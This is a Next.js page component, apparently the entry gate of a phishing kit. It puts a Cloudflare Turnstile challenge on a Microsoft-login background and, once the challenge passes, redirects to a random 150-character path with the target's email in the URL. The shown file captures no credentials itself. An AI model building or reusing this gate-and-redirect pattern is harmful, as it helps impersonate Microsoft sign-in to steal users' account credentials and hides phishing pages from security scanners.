"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import Turnstile from "react-turnstile"
import Head from "next/head"

const generateRandomString = (length: number) => {
  const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

export default function Home() {
  const router = useRouter()
  const [verified, setVerified] = useState(false)

  const handleVerify = (token: string) => {
    console.log(`Challenge Success ${token}`)
    setVerified(true)

    const savedEmail = 'example@outlook.com';
    const randomPath = generateRandomString(150);
    router.push(`/${randomPath}/verify?email=${encodeURIComponent(savedEmail)}`)
  }

  return (
    <>
      <Head>
        <link 
          rel="icon" 
          href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAA2klEQVR42mP8z/D/PwMVwejAAAe9g+/+Mwz6JsAwCDyAcZA7ADrwQXkBw6BzAAM0CgaHAxihUTDoHMAIdcTgcADYEQPVAf8ZGf4zQqNg8DgAHBX4o2PQOACchwZLGoBHwWBwADwKBocDGEkxzAhNF4PGAYzQRDgoHDBQ9QGi6sPB4QAGaF0waByAXicMBgcwoEfBwDvgP3r1O/AdgF4MO/xnZPj3n4FhEDgAvTYcFA5AHwUYBtwB6KMAw4A7AD0KMGqEUQeMOmDUAaMOGHXAqANGHTDqgFEHjDpg1AEA0Oj8DKZhNQIAAAAASUVORK5CYII=" 
          type="image/x-icon"
        />
      </Head>
      <div 
        className="flex flex-col items-center justify-center min-h-screen"
        style={{
          background: `url('https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg')`
        }}
      >
        <div className="">
          <Turnstile
            sitekey="0x4AAAAAAA6CFDdKvLQb_haQ" 
            onVerify={handleVerify}
            refreshExpired="auto"
            fixedSize={true}
          />
          {verified && (
            <p className="mt-4 text-green-600 text-center">
              Verification successful!
            </p>
          )}
        </div>
      </div>
    </>
  )
}
